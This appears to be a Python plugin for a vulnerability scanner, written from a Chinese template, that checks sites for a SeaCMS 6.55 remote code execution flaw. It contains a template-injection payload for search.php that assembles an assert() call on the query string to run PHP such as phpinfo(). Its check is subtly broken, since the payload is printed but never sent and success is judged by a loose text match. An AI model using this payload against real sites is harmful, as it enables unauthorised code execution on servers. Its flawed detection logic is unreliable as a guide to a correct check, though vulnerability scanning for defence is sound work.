#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 漏洞名称（禁止换行）控制在30字以内
referer: 漏洞地址（禁止换行）未知请填unknown
author: 作者名
description: 漏洞描述 
'''
import sys
import requests
import warnings
sys.path.append('../../')
from color import *
#方法名称自定义
class seacms_655_code_exec:
    def __init__(self, url):
        self.url = url
    def run(self):
        #此处编辑检测代码
        #示例代码，请尽量使用彩色字体 printGreen、 printBlue、printYellow函数
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/*"
        url_path = self.url + "/search.php?phpinfo();"
        try:
            result = requests.get(url_path, timeout=3,headers=headers, verify=False)
            if result.status_code == 200 and 'code' in result.text:
                printGreen("[+]Success:存在seacms 6.55 代码执行漏洞！\nPayload:\nURL:%s\nPOST:%s"%(url_path,payload))
                sys.exit(1)
            else:
                printBlue("[-]Info:不存在seacms 6.55 代码执行漏洞")
                sys.exit(1)
        except Exception as e:
            # print (e)
            printYellow("[-]Warning:"+self.__class__.__name__+" ==>可能不存在漏洞")
            sys.exit(1)

if __name__ == "__main__":
    #此处不会调用
    warnings.filterwarnings("ignore")
    testVuln = seacms_655_code_exec("http://baidu.com")
    testVuln.run()